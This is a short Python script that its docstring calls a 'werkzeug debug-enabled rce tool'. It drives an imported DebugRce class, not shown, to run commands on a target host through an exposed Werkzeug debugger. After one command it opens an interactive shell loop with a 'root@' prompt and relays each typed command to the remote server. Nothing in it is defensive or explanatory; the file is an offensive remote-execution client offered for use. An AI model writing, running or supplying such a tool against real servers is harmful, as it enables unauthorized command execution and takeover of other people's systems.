#!/usr/bin/env python
'''werkzeug debug-enabled rce tool'''
from sys import argv, exit as sysexit
from werkzeug_rce import DebugRce

if __name__ == '__main__':
	d = DebugRce(argv[1])
	d.exec(argv[2])

	while True:
		try:
			cmd = input(f'root@{argv[1]}:~$ ')
			for line in d.exec(cmd):
				print(line)
		except KeyboardInterrupt:
			print('\nQuiting!')
			sysexit()
